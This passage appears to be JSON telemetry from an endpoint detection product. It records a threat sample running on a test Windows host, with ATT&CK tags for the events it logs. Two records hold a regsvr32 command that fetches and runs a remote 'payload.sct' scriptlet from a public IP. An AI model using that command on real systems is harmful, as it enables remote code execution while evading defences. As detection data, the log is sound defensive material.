+                "path": "C:\\Users\\mcafee\\AppData\\Local\\Temp\\_MEI37562",
+                "sha1": "",
+                "size": 4096,
+                "sha256": "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855",
+                "fsattrs": 16,
+                "creationDate": "2024-10-21T13:14:07.594Z",
+                "lastModificationDate": "2024-10-21T13:14:09.423Z"
+            },
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 11444,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 12440,
+            "tags": [
+                "@AC.AdminHackingToolExecuted",
+                "@AC.ProcessCreated"
+            ],
+            "time": "2024-10-21T13:14:08.624Z",
+            "user": {
+                "id": "S-1-5-21-1948797817-3766102643-2941516715-1001",
+                "name": "mcafee",
+                "domain": "DESKTOP-2HS9OV4"
+            },
+            "dtsId": "EDR",
+            "pSha2": "F6C9532E1F4B66BE96F0F56BD7C3A3C1997EA8066B91BFCC984E41F072C347BA",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "cmdLine": "cmd  /c \"REGSVR32 /u /n /s /i:http://216.58.194.85\\folder\\payload.sct scrobj.dll\"",
+            "dtsType": "all",
+            "traceId": "0803a4e9-a50a-4a89-9b90-63933d9e2017",
+            "version": "3.0",
+            "severity": "s0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "Process Created",
+            "h_version": "3.0",
+            "integrity": 2,
+            "nonpeType": "commandline",
+            "pFullName": "C:\\Windows\\System32\\cmd.exe",
+            "cmdLineMd5": "2F8478977C235BEA23C26F1CBF81DA3C",
+            "tdmRuleIds": [
+                103,
+                100000,
+                100003
+            ],
+            "cmdLineSha1": "2A6F995D61136651AAFA533CBFC0EC5805ECAC95",
+            "h_traceType": "all",
+            "interpreter": "cmd",
+            "processName": "cmd.exe",
+            "cmdLineSha256": "0C755F0CEB04E0531345CD6128D2AAC49177F584D26022A187A9A84DB92200A7",
+            "detectionDate": "2024-10-21T06:16:29Z",
+            "parentTraceId": "94736f85-c772-4549-a36b-0d5ecaeae897",
+            "procFileAttrs": {
+                "md5": "C5DB7B712F280C3AE4F731AD7D5EA171",
+                "name": "cmd.exe",
+                "path": "C:\\Windows\\System32\\cmd.exe",
+                "sha1": "E8717FF0D40E01FD3B06DE2AA5A401BED1C907CC",
+                "size": 331776,
+                "sha256": "F6C9532E1F4B66BE96F0F56BD7C3A3C1997EA8066B91BFCC984E41F072C347BA",
+                "subsystem": 3,
+                "reputation": {
+                    "reputation": 99,
+                    "vtpPrivileges": 1
+                },
+                "creationDate": "2021-06-05T12:05:12.279Z",
+                "embedFilename": "Cmd.Exe",
+                "embedVendorName": "Microsoft Corporation",
+                "embedFileVersion": "10.0.22000.1 (WinBuild.160101.0800)",
+                "embedProductName": "Microsoft® Windows® Operating System",
+                "embedProductVersion": "10.0.22000.1"
+            },
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "detectionsSets": [
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1218.010",
+                        "@ATE.T1059.001",
+                        "@MSI._process_regsvr32_geno_cmd"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATE.T1059.003",
+                        "@MSI._process_cmd_public_ip"
+                    ]
+                }
+            ],
+            "parentsTraceId": [
+                "94736f85-c772-4549-a36b-0d5ecaeae897",
+                "7a93304f-da5a-4d19-b1b6-f9956a4ddf7c",
+                "6021e53d-7d34-458c-9941-327f6efc2869",
+                "307023b5-d6ef-42b0-8be0-602c1b771a05"
+            ],
+            "endTime": null,
+            "originalSeverity": "s0",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "0803a4e9-a50a-4a89-9b90-63933d9e2017",
+            "lastActivityTime": "2024-10-21T13:14:08.754Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 3756,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 3756,
+            "tags": [
+                "@AC.NonPECreated"
+            ],
+            "time": "2024-10-21T13:14:07.604Z",
+            "dtsId": "EDR",
+            "pSha2": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "dtsType": "all",
+            "traceId": "966b933e-0515-4a2c-9dc3-8e5e996e54ba",
+            "version": "3.0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "File Created",
+            "h_version": "3.0",
+            "pFullName": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+            "h_traceType": "all",
+            "uniqueRuleId": 1,
+            "detectionDate": "2024-10-21T06:16:59Z",
+            "parentTraceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "fileAttributes": {
+                "md5": "D41D8CD98F00B204E9800998ECF8427E",
+                "name": "_MEI37562",
+                "path": "C:\\Users\\mcafee\\AppData\\Local\\Temp\\_MEI37562",
+                "sha1": "DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+                "size": 4096,
+                "sha256": "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855",
+                "fsattrs": 16,
+                "creationDate": "2024-10-21T13:14:07.594Z",
+                "lastModificationDate": "2024-10-21T13:14:07.594Z"
+            },
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 3756,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 3756,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "time": "2024-10-21T13:14:07.653Z",
+            "dtsId": "EDR",
+            "pSha2": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "dtsType": "all",
+            "traceId": "818c4c5a-9952-42d6-a7ac-59a97643d4e9",
+            "version": "3.0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "File Created",
+            "h_version": "3.0",
+            "pFullName": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+            "h_traceType": "all",
+            "uniqueRuleId": 21,
+            "detectionDate": "2024-10-21T06:16:59Z",
+            "parentTraceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "fileAttributes": {
+                "md5": "838972583B872F2C503EC88F3CDF55C7",
+                "name": "python27.dll",
+                "path": "C:\\Users\\mcafee\\AppData\\Local\\Temp\\_MEI37562\\python27.dll",
+                "sha1": "1E594B264F2CE7A4D621AEF2BB7BC65343799B34",
+                "size": 3429376,
+                "sha256": "FE55C3AD1E217ADA3A1938F3F1FC7AD2D60E2E9FDF02EF751D6D0D2471350301",
+                "fsattrs": 32,
+                "fileType": "PE",
+                "creationDate": "2024-10-21T13:14:07.641Z",
+                "embedFilename": "python27.dll",
+                "embedVendorName": "Python Software Foundation",
+                "embedFileVersion": "2.7.17",
+                "embedProductName": "Python",
+                "embedProductVersion": "2.7.17",
+                "lastModificationDate": "2024-10-21T13:14:07.673Z"
+            },
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "api": {
+                "name": "ResumeThread",
+                "result": "1",
+                "arguments": [
+                    "0x200"
+                ],
+                "targetPid": 12428,
+                "moduleName": "",
+                "targetProcessFull": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe"
+            },
+            "pid": 3756,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 3756,
+            "tags": [
+                "@AC.APICall"
+            ],
+            "time": "2024-10-21T13:14:07.704Z",
+            "dtsId": "EDR",
+            "pSha2": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "dtsType": "all",
+            "traceId": "4ea368fb-28ca-4d5b-9897-55805ce32e2e",
+            "version": "3.0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "Api",
+            "h_version": "3.0",
+            "pFullName": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+            "h_traceType": "all",
+            "uniqueRuleId": 19115,
+            "detectionDate": "2024-10-21T06:16:29Z",
+            "parentTraceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 10312,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 11444,
+            "tags": [
+                "@AC.AdminHackingToolExecuted",
+                "@AC.ProcessCreated"
+            ],
+            "time": "2024-10-21T13:14:08.754Z",
+            "user": {
+                "id": "S-1-5-21-1948797817-3766102643-2941516715-1001",
+                "name": "mcafee",
+                "domain": "DESKTOP-2HS9OV4"
+            },
+            "dtsId": "EDR",
+            "pSha2": "73211CDB4C7756FF0E9F33F8F377D6AC2E863DD02208D7E7D7B9EB03FE76623B",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "cmdLine": "REGSVR32  /u /n /s /i:http://216.58.194.85\\folder\\payload.sct scrobj.dll",
+            "dtsType": "all",
+            "traceId": "e6ac6b43-76b0-4ad2-be74-923f1c44f2f7",
+            "version": "3.0",
+            "severity": "s4",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "Process Created",
+            "h_version": "3.0",
+            "integrity": 2,
+            "pFullName": "C:\\Windows\\System32\\cmd.exe",
+            "tdmRuleIds": [
+                1333,
+                100003
+            ],
+            "h_traceType": "all",
+            "processName": "regsvr32.exe",
+            "detectionDate": "2024-10-21T06:16:29Z",
+            "parentTraceId": "0803a4e9-a50a-4a89-9b90-63933d9e2017",
+            "procFileAttrs": {
+                "md5": "8BE4DCFA9B928A75DA38C0DADF90D727",
+                "name": "regsvr32.exe",
+                "path": "C:\\Windows\\System32\\regsvr32.exe",
+                "sha1": "3ECCE8DB23DD1ED4C5DD86B4C1CBA878F894D678",
+                "size": 45056,
+                "sha256": "73211CDB4C7756FF0E9F33F8F377D6AC2E863DD02208D7E7D7B9EB03FE76623B",
+                "subsystem": 2,
+                "reputation": {
+                    "reputation": 99,
+                    "vtpPrivileges": 1
+                },
+                "creationDate": "2024-10-16T14:34:48.082Z",
+                "embedFilename": "REGSVR32.EXE",
+                "embedVendorName": "Microsoft Corporation",
+                "embedFileVersion": "10.0.22000.653 (WinBuild.160101.0800)",
+                "embedProductName": "Microsoft® Windows® Operating System",
+                "embedProductVersion": "10.0.22000.653"
+            },
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "detectionsSets": [
+                {
+                    "sev": "s2",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.DefenseEvasion",
+                        "@ATA.CommandAndControl",
+                        "@ATE.T1047",
+                        "@ATE.T1564.004",
+                        "@ATE.T1105",
+                        "@MSI._process_lolbas_public_ip"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATE.T1218.010",
+                        "@MSI._process_regsvr32_register"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.CommandAndControl",
+                        "@ATE.T1105",
+                        "@ATE.T1218.010",
+                        "@MSI._process_remoteregsvr32_public_ip"
+                    ]
+                }
+            ],
+            "parentsTraceId": [
+                "0803a4e9-a50a-4a89-9b90-63933d9e2017",
+                "94736f85-c772-4549-a36b-0d5ecaeae897",
+                "7a93304f-da5a-4d19-b1b6-f9956a4ddf7c",
+                "6021e53d-7d34-458c-9941-327f6efc2869",
+                "307023b5-d6ef-42b0-8be0-602c1b771a05"
+            ],
+            "endTime": null,
+            "originalSeverity": "s4",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "e6ac6b43-76b0-4ad2-be74-923f1c44f2f7",
+            "lastActivityTime": "2024-10-21T13:14:08.754Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "api": {
+                "data": "AAA9vEsCAAA=",
+                "name": "WriteProcessMemory",
+                "result": "0",
+                "arguments": [
+                    "0xb93bd392d8",
+                    "0x8",
+                    "0x0"
+                ],
+                "targetPid": 12428,
+                "moduleName": "",
+                "targetProcessFull": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe"
+            },
+            "pid": 3756,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 3756,
+            "tags": [
+                "@AC.APICall"
+            ],
+            "time": "2024-10-21T13:14:07.704Z",
+            "dtsId": "EDR",
+            "pSha2": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "dtsType": "all",
+            "traceId": "a4966530-5759-4b32-b541-6210421966c0",
+            "version": "3.0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "Api",
+            "h_version": "3.0",
+            "pFullName": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+            "h_traceType": "all",
+            "uniqueRuleId": 11,
+            "detectionDate": "2024-10-21T06:16:29Z",
+            "parentTraceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "action": "",
+            "productId": "",
+            "description": ""
+        }
+    ]
+}
